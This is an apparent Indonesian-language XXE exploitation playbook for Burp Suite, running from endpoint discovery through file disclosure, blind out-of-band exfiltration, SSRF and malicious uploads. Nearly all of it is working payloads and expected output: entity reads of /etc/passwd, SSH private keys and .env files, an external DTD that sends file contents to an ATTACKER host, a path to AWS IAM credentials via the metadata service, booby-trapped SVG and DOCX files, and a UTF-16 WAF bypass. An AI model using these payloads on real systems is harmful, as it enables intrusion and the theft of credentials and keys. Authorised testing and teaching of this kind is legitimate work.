### Langkah 0.1 — Gunakan Burp HTTP History

```text
1. Browse seluruh aplikasi dengan Burp proxy aktif
2. Proxy → HTTP History
3. Filter Column "Mime Type" → cari: XML, HTML (SOAP), Text
4. Filter Column "Params" → cari: body dengan XML content
5. Cari request Content-Type:
   - application/xml
   - text/xml
   - application/soap+xml
6. Juga cari di "Response" tab: SOAPAction, WSDL links
```

**OUTPUT BERHASIL ✅ — XML endpoint ditemukan:**

```text
POST /product/stock       Content-Type: application/xml
POST /api/import          Content-Type: application/xml
POST /soap/service        SOAPAction: header present
GET  /upload              ada form upload file
```

➡️ Catat semua endpoint. Lanjut ke **Langkah 0.2**

---

### Langkah 0.2 — Identifikasi File Upload

```text
Di Burp HTTP History, cari request:
1. POST ke /upload, /avatar, /import, /document
2. Content-Type: multipart/form-data dengan file
3. Response yang berisi preview URL atau file path
```

**OUTPUT BERHASIL ✅ — Upload endpoint ditemukan:**

```text
POST /my-account/avatar    → upload avatar (kandidat SVG → Fase 5A)
POST /api/document         → upload dokumen (kandidat DOCX → Fase 5B)
```

> **Format file yang mungkin memproses XML server-side:** SVG, XML, XHTML, DOCX, XLSX, ODT

---

## ══════════════════════════════════════

## FASE 1: Konfirmasi XML Parser

## ══════════════════════════════════════

> **Tujuan:** Konfirmasi entity resolution step by step. JANGAN loncat.

### Langkah 1.1 — Level 0: Baseline XML (Burp Repeater)

Temukan XML request di HTTP History → klik kanan → **Send to Repeater**

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — 200 OK, data diproses:**

```http
HTTP/1.1 200 OK
{"price":"$29.99"}
```

➡️ Parser menerima XML. Lanjut ke **Langkah 1.2**

**OUTPUT GAGAL ❌ — 415 Unsupported Media Type:**

➡️ Di Repeater, ubah Content-Type:

```text
Coba: Content-Type: text/xml
Coba: Content-Type: application/xml; charset=utf-8
```

---

### Langkah 1.2 — Level 1: Internal Entity Test

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY test "XXE_ENTITY_TEST_123">
]>
<stockCheck>
    <productId>&test;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Entity di-resolve:**

```http
HTTP/1.1 200 OK
"Invalid product ID: XXE_ENTITY_TEST_123"
```

➡️ DTD processing aktif! Lanjut ke **Langkah 1.3**

**OUTPUT GAGAL ❌ — Entity literal muncul atau DOCTYPE ditolak:**

```text
{"name":"&test;"}
```

atau

```text
{"error":"DOCTYPE is disallowed"}
```

➡️ Coba **XInclude (Langkah 1.4)** atau **File Upload (Fase 5A/5B)**

---

### Langkah 1.3 — Level 2: External Entity / File Read

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — File dibaca:**

```http
HTTP/1.1 200 OK
"Invalid product ID: web01"
```

➡️ **XXE CONFIRMED!** Lanjut ke **Fase 2** (baca file sensitif)

**OUTPUT BERHASIL ✅ — Ada response tapi entity value kosong:**

```http
{"productId":""}
```

➡️ Entity resolve tapi konten tidak di-reflect. Lanjut ke **Fase 3 (Blind XXE)**

**OUTPUT GAGAL ❌ — Permission denied:**

➡️ Parser resolve entity tapi tidak bisa baca file. Coba:

```xml
<!ENTITY xxe SYSTEM "file:///etc/hosts">
<!ENTITY xxe SYSTEM "file:///proc/version">
```

---

### Langkah 1.4 — Fallback: XInclude (Jika DOCTYPE Diblok)

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/hostname"/>
</foo>
```

atau inject langsung ke field form (jika server embed user input ke XML):

```text
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

**OUTPUT BERHASIL ✅ — XInclude bekerja:**

```http
HTTP/1.1 200 OK
{"result":"web01"}
```

**OUTPUT GAGAL ❌ — XInclude tidak support:**

➡️ Coba SVG upload (Fase 5A) atau DOCX/XLSX (Fase 5B)

> `parse="text"` wajib — tanpanya parser mencoba parse isi file sebagai XML dan biasanya gagal.

---

## ══════════════════════════════════════

## FASE 2: File Disclosure — Baca File Sensitif

## ══════════════════════════════════════

> **Masuk sini setelah Fase 1.3 konfirmasi `file:///` bekerja.**

### Langkah 2.1 — File Disclosure Matrix

Test satu per satu di **Burp Repeater**. Ganti nilai entity di `SYSTEM "..."`.

**Linux — Target Utama:**

```text
file:///etc/passwd           → user list + shell users
file:///etc/hosts            → network topology
file:///etc/hostname         → machine name (start di sini)
file:///proc/net/arp         → ARP table (discover internal IPs)
file:///home/user/.ssh/id_rsa     → SSH private key
file:///root/.ssh/id_rsa          → root SSH key
file:///var/www/html/.env         → app credentials
file:///var/www/html/config.php   → app credentials (gunakan php://filter jika ada <?)
```

**Windows — Target Utama:**

```text
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
file:///C:/xampp/htdocs/config.php
```

**OUTPUT BERHASIL ✅ — /etc/passwd dibaca:**

```text
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

➡️ Identifikasi users yang punya shell (bukan `/nologin`):

```bash
echo 'PASTE_PASSWD_CONTENT' | grep -v 'nologin\|false' | cut -d: -f1
```

---

### Langkah 2.2 — PHP Source Code via php://filter `[PHP-specific]`

> **Teknik PHP-specific:** hanya bekerja di server PHP dengan stream wrapper aktif. Bukan fallback universal — tidak tersedia di server Java, .NET, Node.js, dll.

**Gunakan ini ketika:** file PHP mengandung `<?php`, `>`, `&` yang merusak XML parser.

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Base64 output di response:**

```http
HTTP/1.1 200 OK
"Invalid product ID: PD9waHAKJGRiX2hvc3Q..."
```

Decode di terminal:

```bash
echo 'PD9waHAKJGRiX2hvc3Q...' | base64 -d
```

Output:

```php
<?php
$db_host = "localhost";
$db_user = "admin";
$db_pass = "SuperSecret2024!";
```

---

## ══════════════════════════════════════

## FASE 3: Blind XXE

## ══════════════════════════════════════

> **Masuk sini jika: entity di-resolve tapi output tidak terlihat di response.**

### Langkah 3.1 — Setup OOB Listener

**Terminal 1 — DTD Server:**

```bash
mkdir -p ~/xxe_loot/dtd
cat > ~/xxe_loot/dtd/xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
%eval;
%send;
EOF

cd ~/xxe_loot/dtd && python3 -m http.server 8000
```

Atau gunakan **Burp Collaborator** (Pro): Burp Menu → Collaborator client → Copy domain.

---

### Langkah 3.2 — Konfirmasi OOB Connectivity

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://ATTACKER:8000/xxe-test">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Callback masuk di terminal:**

```text
10.10.11.200 - - "GET /xxe-test HTTP/1.1" 200 -
```

➡️ [STEP A: OOB Connectivity — confirmed] ✓

> **OOB Exfiltration memerlukan 3 steps yang BERBEDA:**
> 
> - **STEP A — Connectivity proof:** parser dapat melakukan outbound request ✓ (sudah konfirmasi)
> - **STEP B — Data transport proof:** data dapat benar-benar dibawa via channel
> - **STEP C — Arbitrary file exfil:** file target compatible dengan transport/encoding/parser
> 
> Keberhasilan STEP A **tidak menjamin** STEP C berhasil. File dengan newline, whitespace, XML-special chars (`<`, `>`, `&`), atau URI encoding constraints dapat menyebabkan STEP C gagal walaupun STEP A berhasil.

Lanjut ke **Langkah 3.3** — test data transport

**OUTPUT GAGAL ❌ — Tidak ada callback (silence):**

➡️ Egress filtered. Coba DNS via Burp Collaborator:

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR_DOMAIN/">
]>
```

Di Collaborator window → klik "Poll now" → lihat DNS query masuk.

Jika DNS juga blocked → coba **Local DTD Repurpose (3.5/Fase 6)** terlebih dahulu; jika local DTD tidak tersedia dan parser verified libxml2/PHP → coba **Error-Based (3.4)** [parser-specific]

---

### Langkah 3.3 — Blind XXE via External DTD

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://ATTACKER:8000/xxe.dtd">
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — DTD request + data callback:**

```text
10.10.11.200 - - "GET /xxe.dtd HTTP/1.1" 200 -
10.10.11.200 - - "GET /?d=web01 HTTP/1.1" 200 -
```

Data `web01` = isi `/etc/hostname`.

➡️ Ganti file target di `xxe.dtd`:

```bash
# Target /etc/passwd
sed -i 's|file:///etc/hostname|file:///etc/passwd|' ~/xxe_loot/dtd/xxe.dtd

# Target SSH private key
sed -i 's|file:///etc/hostname|file:///home/user/.ssh/id_rsa|' ~/xxe_loot/dtd/xxe.dtd

# Target PHP config (base64 via php wrapper)
sed -i 's|file:///etc/hostname|php://filter/convert.base64-encode/resource=/var/www/html/config.php|' ~/xxe_loot/dtd/xxe.dtd
```

Kirim ulang payload di Repeater dan observe terminal callback.

> **⚠️ Jika OOB connectivity berhasil tapi file exfil gagal atau data tidak muncul di callback:** Kemungkinan penyebab (bersifat parser/environment-dependent — tidak selalu sama):
> 
> - File mengandung newline → di-encode ke `%0A` → URL menjadi invalid atau truncated
> - File mengandung `<`, `>`, `&` → break XML parsing sebelum data sampai ke OOB
> - File terlalu besar → URL di-truncate oleh parser atau network layer
> - URI encoding constraint di parser mempengaruhi transport
> - File tidak readable oleh server process (permission issue)
> 
> **Solusi kandidat:** gunakan `php://filter/convert.base64-encode` (PHP-specific) untuk encoding yang aman, atau test dulu dengan `/etc/hostname` (pendek, plain) sebelum mencoba file yang lebih kompleks.

> **Mengapa `&#x25;` di xxe.dtd?** Parameter entity tidak bisa di-nest langsung di Internal DTD Subset. `&#x25;` adalah HTML entity untuk `%`, memungkinkan deklarasi nested entity. Lihat [Technical Reference: Parameter Entity Rules](#parameter-entity-rules--trick).

---

### Langkah 3.4 — Blind XXE via Error Messages `[Parser-specific: libxml2/PHP]`

**Gunakan jika:** tidak bisa outbound tapi ada **error message terlihat di response**.

> **Parser-specific:** Teknik ini menggunakan konstruksi `&#x25;` (encoded `%`) di dalam internal DTD subset — ini adalah ekstensi libxml2, bukan XML spec-defined behavior. Bekerja di libxml2 (PHP/Linux). Java Xerces dan .NET kemungkinan menolak konstruksi ini. **Urutan yang benar:** coba **Langkah 3.5 (Local DTD Repurpose) / Fase 6 terlebih dahulu** — parser-agnostic. Gunakan teknik ini hanya jika local DTD tidak tersedia DAN parser/version sudah diverifikasi sebagai libxml2/PHP. Kegagalan teknik ini di parser selain libxml2 bukan false negative.

**Evaluasi kondisi sebelum testing:**

1. Error message dari parser terlihat di response body (4xx/5xx)?
2. Parser kemungkinan libxml2/PHP environment?
3. Attacker-controlled data berpotensi sampai ke error path?

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Error mengandung file content:**

```http
HTTP/1.1 400 Bad Request

"XML parser error: failed to load external entity
'file:///nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:...'"
```

➡️ `/etc/passwd` bocor di error! Ganti `file:///etc/passwd` ke target lain.

---

### Langkah 3.5 — Local DTD Repurpose (No Outbound + Error Visible)

**Gunakan jika:** tidak ada outbound sama sekali tapi ada error message. Detail → **Fase 6**.

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Data bocor tanpa outbound:**

```http
HTTP/1.1 400 Bad Request
"failed to load 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash...'"
```

---

## ══════════════════════════════════════

## FASE 4: XXE → SSRF

## ══════════════════════════════════════

> **Masuk sini setelah `file:///` bekerja, untuk probe internal services.**

### Langkah 4.1 — Test SSRF ke Localhost

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Internal service ditemukan:**

```http
HTTP/1.1 200 OK
"Invalid product ID: <!DOCTYPE html><html><title>Internal Admin</title>..."
```

➡️ Port open! Explore endpoint-nya.

**Port sweep via Burp Intruder:**

```text
1. Di Repeater → klik kanan → Send to Intruder
2. Tab Positions → highlight PORT: "http://127.0.0.1:§8080§/"
3. Tab Payloads → Common ports list dahulu (sesuai objective dan scope):
   80, 443, 8080, 8000, 8443, 3000, 6379, 27017, 9200, 3306, 5432
   Expand ke range lebih luas hanya jika rules of engagement mengizinkan.
4. Start Attack → sort by Response Length → panjang berbeda = kandidat port open
```

**Common internal ports:**

```text
80, 443, 8080, 8000, 3000    → web services
6379                          → Redis
27017                         → MongoDB
9200                          → Elasticsearch
3306                          → MySQL
5432                          → PostgreSQL
```

**Response indicators** (interpretasi bersifat inferential — parser & network dependent):

```text
HTML/JSON content   → port open, ada service [HIGH CONFIDENCE]
parser error detail → port open tapi tidak return konten [MEDIUM CONFIDENCE]
"connection refused" → port kemungkinan closed [LOW CONFIDENCE — bisa juga parser error format, jangan rely satu indikator]
timeout             → port kemungkinan filtered [LOW CONFIDENCE — bisa juga slow service atau parser timeout behavior]
```

> ⚠️ SSRF detection dari XXE bersifat indirect dan parser-dependent. Perhatikan kombinasi: status code, body length, timing, dan content. Satu indikator tidak cukup untuk konfirmasi port status.

---

### Langkah 4.2 — Cloud Metadata via XXE

> **Evaluate dulu — required request semantics per cloud provider:**
> 
> |Provider|Interface|XXE Compatible?|
> |---|---|---|
> |AWS IMDSv1|GET, no required header|✅ Yes|
> |AWS IMDSv2|PUT + `X-aws-ec2-metadata-token-ttl-seconds`|❌ No (PUT required)|
> |GCP|GET + `Metadata-Flavor: Google` header|❌ No (header required)|
> |Azure|GET + `Metadata: true` header|❌ No (header required)|
> 
> Jika provider membutuhkan header khusus yang tidak bisa dikirim via XXE GET, document limitation ini — jangan mengklaim dapat diakses tanpa verifikasi.

**AWS IMDSv1 — test jika target di AWS (Di Burp Repeater):**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — IMDSv1 accessible:**

```http
HTTP/1.1 200 OK
"ami-id\nami-launch-index\nhostname\niam/"
```

➡️ Lanjut ambil IAM credentials:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

Dapat role name → ambil credentials:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">
```

**OUTPUT GAGAL ❌ — Timeout / 401 / empty:**

```text
AWS IMDSv2 aktif  → PUT + header token required → tidak bisa via XXE GET
                    Document sebagai limitation di report
GCP target        → Metadata-Flavor: Google header required → tidak via bare XXE GET
Azure target      → Metadata: true header required → tidak via bare XXE GET
```

---

## ══════════════════════════════════════

## FASE 5: XXE via File Upload

## ══════════════════════════════════════

> **Prerequisite — verifikasi server-side XML parsing:** Apakah server melakukan server-side parsing, conversion, atau preview terhadap file yang di-upload?
> 
> - **YES** → evidence: preview URL, thumbnail, conversion output, atau parser error dari server
> - **NO** → file hanya disimpan / dikirim ke browser → **bukan attack surface XXE via upload**
> 
> File format yang mengandung XML (SVG, DOCX, XLSX, ODT) tidak otomatis berarti XXE possible. Yang menentukan adalah apakah ada server-side XML processing — bukan format file-nya. Cari endpoint conversion, thumbnail generator, atau document preview API terlebih dahulu.

### Fase 5A — SVG Upload (Burp Suite)

**Step 1 — Intercept upload di Burp:**

```text
1. Proxy → Intercept → ON
2. Upload file SVG valid kecil di browser
3. Request tertangkap → Send to Repeater
4. Proxy → Forward
```

**Step 2 — Modify di Repeater:**

```http
POST /my-account/avatar HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="avatar"; filename="xxe.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <text x="10" y="30" font-size="10">&xxe;</text>
</svg>
------Boundary--
```

**Step 3 — Klik Send, akses preview URL:**

```http
GET /files/avatars/xxe.svg HTTP/1.1
```

**OUTPUT BERHASIL ✅ — Data muncul di SVG preview:**

```http
HTTP/1.1 200 OK
<svg>...<text>root:x:0:0:root:/root:/bin/bash...</text></svg>
```

**Blind SVG XXE (jika preview tidak di-render):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg SYSTEM "http://ATTACKER:8000/xxe.dtd">
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <text x="10" y="30">test</text>
</svg>
```

Upload → cek terminal OOB server apakah ada request ke `/xxe.dtd`.

---

### Fase 5B — DOCX Upload

**Step 1 — Buat DOCX payload di terminal:**

```bash
mkdir -p /tmp/xxe_docx/word /tmp/xxe_docx/_rels

cat > /tmp/xxe_docx/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
EOF

cat > /tmp/xxe_docx/\[Content_Types\].xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
EOF

cat > /tmp/xxe_docx/_rels/.rels << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
EOF

cd /tmp/xxe_docx && zip -r /tmp/xxe_payload.docx . > /dev/null
echo "[*] Created: /tmp/xxe_payload.docx"
```

**Step 2 — Upload via Burp Repeater (intercept) atau curl:**

```bash
# curl OK untuk upload file saja
curl -i \
  -F "file=@/tmp/xxe_payload.docx" \
  "http://$TARGET/upload"
```

> **Kondisi yang harus terpenuhi:**
> 
> 1. Server melakukan server-side XML parsing / extraction dari DOCX (bukan hanya storage)
> 2. Parser tidak disable external entities
> 3. Ada observable response (file preview, conversion result, atau error)
> 
> Banyak library modern (python-docx, Apache POI baru) sudah disable external entities by default. Tidak ada bypass jika library sudah hardened.

---

## ══════════════════════════════════════

## FASE 6: Repurposing Local DTD

## ══════════════════════════════════════

> **Gunakan jika:** tidak ada outbound HTTP sama sekali, ada error message terlihat di response, dan local DTD tersedia di server (environment-dependent — tidak dijamin). Teknik ini tidak butuh koneksi keluar sama sekali. Jika local DTD tidak ditemukan di semua candidate paths → teknik ini tidak tersedia di environment ini.

### Langkah 6.1 — Temukan Local DTD

**Di Burp Suite → Repeater (test path DTD satu per satu):**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — Error menyebut entity di DTD:**

```http
HTTP/1.1 400 Bad Request
"XML parser error: entity 'ISOamso' already defined at ..."
```

➡️ DTD ditemukan! Entity `ISOamso` ada di dalamnya → gunakan entity ini di Langkah 6.2.

**Common local DTD candidate paths** (environment-dependent — availability tidak dijamin):

```text
Linux (GNOME/Ubuntu/Debian) — tergantung distro & installed packages:
/usr/share/yelp/dtd/docbookx.dtd           (contoh entity: ISOamso — bergantung versi DTD)
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/sgml/docbook/sgml-dtd-4.2-*/docbook.dtd
/usr/share/docbook-utils/sgml/docbook/dtd/docbook.dtd
/usr/share/sgml/html/4.01/dtd/html401.dtd

Windows — tergantung installed software:
C:\Windows\System32\wbem\cimwin32.dtd
C:\Program Files\Common Files\Microsoft Shared\...
```

> Path availability, entity names, dan DTD version bergantung pada distro, OS version, dan installed packages. Entity name `ISOamso` adalah contoh dari `docbookx.dtd` — DTD lain menggunakan entity name yang berbeda. Jika semua path gagal → teknik ini tidak tersedia di environment ini.

---

### Langkah 6.2 — Exploit dengan Override Entity

**Di Burp Suite → Repeater:**

```http
POST /product/stock HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**OUTPUT BERHASIL ✅ — /etc/passwd di error message:**

```http
HTTP/1.1 400 Bad Request
"failed to load 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash\ndaemon:...'"
```

**Cara kerja:**

```text
1. %local_dtd; → load DTD lokal dari server itu sendiri
2. Sebelum load, entity 'ISOamso' sudah di-override dengan payload kita
3. Ketika DTD lokal diproses, 'ISOamso' sudah berisi logic kita
4. %file; → baca /etc/passwd
5. %error; → buat invalid path berisi isi file → error message berisi data
6. Tidak butuh outbound HTTP sama sekali!
```

---

## 📦 Context-Specific

### XXE di SOAP

**Identifikasi SOAP endpoint:**

```text
Content-Type: text/xml  atau  application/soap+xml
SOAPAction: header present
Body dimulai dengan: <soap:Envelope
Endpoint: /soap, /ws, /service, /wsdl
```

**Inject XXE di SOAP (Burp Repeater):**

```http
POST /soap HTTP/1.1
Host: TARGET
Content-Type: text/xml
SOAPAction: "getUser"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <getUser>
            <name>&xxe;</name>
        </getUser>
    </soap:Body>
</soap:Envelope>
```

**SOAP Quick Troubleshooting:**

|Error|Solusi|
|---|---|
|415 Unsupported Media Type|Coba `application/soap+xml` ↔ `text/xml`|
|500 Internal Server Error|Buat baseline SOAP request yang valid dulu|
|Empty response|Cek SOAPAction header sesuai endpoint|

---

### XXE di REST (JSON → XML Switch)

**Scenario:** REST endpoint yang mungkin menerima XML jika Content-Type diubah.

**Di Burp Repeater, ubah dari:**

```http
POST /api/user HTTP/1.1
Content-Type: application/json

{"name":"alice"}
```

**Menjadi:**

```http
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<user>
    <name>&xxe;</name>
</user>
```

**OUTPUT BERHASIL ✅:**

```http
HTTP/1.1 200 OK
{"status":"ok","name":"web01"}
```

---

### XXE di SAML

**Identifikasi SAML:**

```text
Parameter: SAMLResponse atau SAMLRequest (base64-encoded XML)
Endpoint: /saml/acs, /saml/consume, /sso
```

**Approach di Burp:**

```text
1. Intercept SAML request/response di Burp Proxy
2. Tab Decoder → Decode SAMLResponse dari base64
3. Lihat XML structure
4. Inject DOCTYPE + entity sebelum root element
5. Re-encode ke base64
6. Replace di request → Send di Repeater
```

**Fokus testing:**

```text
DOCTYPE support? → coba internal entity test
Entity resolution? → coba file:///etc/hostname
Schema validation ketat? → error mungkin mengandung info
```

> **Penting:** Jangan campur SAML signature bypass dengan XXE. Keduanya adalah kelas masalah yang berbeda. XXE menyerang XML parser; signature bypass menyerang SAML auth logic.

---

## 📚 Technical Reference

### Entity Types

|Type|Deklarasi|Cara Panggil|Context|
|---|---|---|---|
|Built-in|(built-in)|`&lt;` `&gt;` `&amp;` `&quot;` `&apos;`|Di mana saja|
|General entity|`<!ENTITY name "...">`|`&name;`|XML document|
|Parameter entity|`<!ENTITY % name "...">`|`%name;`|DTD only|

**SYSTEM vs PUBLIC:**

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">   ← ini yang selalu digunakan di pentest
<!ENTITY xxe PUBLIC "-//Example//EN" "http://example.com/test.dtd">  ← jarang
```

---

### Parameter Entity Rules (% Trick)

> **Rule kritis:** Parameter entity (`%name;`) **TIDAK BISA di-nest** di dalam Internal DTD Subset.

**ILEGAL — akan error:**

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % send SYSTEM "http://attacker/?d=%file;">  ← ERROR: nesting dilarang
  %send;
]>
```

**Solusi — gunakan External DTD:**

File `xxe.dtd` di server attacker:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?d=%file;'>">
%eval;
%send;
```

**Encoding yang digunakan:**

```text
&#x25; = % (percent sign)  → digunakan karena % literal akan ditolak di dalam nilai entity
&#x26; = & (ampersand)
&#x27; = ' (single quote)
```

**Compatibility notes:**

- **External DTD** (file `xxe.dtd` di attacker server) dengan `%eval;`/`%send;`: kompatibel dengan libxml2, Java Xerces, PHP, dan mayoritas parser lain.
- **Internal DTD `&#x25;` trick** (digunakan di Langkah 3.4): **parser-specific — bukan XML-standard behavior**. Bekerja di libxml2 (PHP/Linux) sebagai ekstensi non-spec. Java Xerces dan .NET mengikuti XML spec lebih ketat → kemungkinan menolak konstruksi ini. **Urutan yang benar jika no outbound + error visible:** (1) coba Local DTD Repurpose (Langkah 3.5/Fase 6) terlebih dahulu — parser-agnostic; (2) gunakan Langkah 3.4 hanya jika local DTD tidak tersedia DAN parser/version sudah diverifikasi sebagai libxml2/PHP. Kegagalan Langkah 3.4 di parser selain libxml2 **bukan false negative** — itu adalah limitasi teknik ini, bukan indikasi target tidak vulnerable.

---

### Encoding Bypass

**UTF-16 (WAF Bypass):**

Beberapa WAF filter `<!DOCTYPE` di UTF-8 tapi tidak di encoding lain.

```bash
python3 - << 'PY' > /tmp/payload_utf16.xml
payload = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><data>&xxe;</data></root>
'''
with open('/tmp/payload_utf16.xml', 'wb') as f:
    f.write(payload.encode('utf-16'))
PY
```

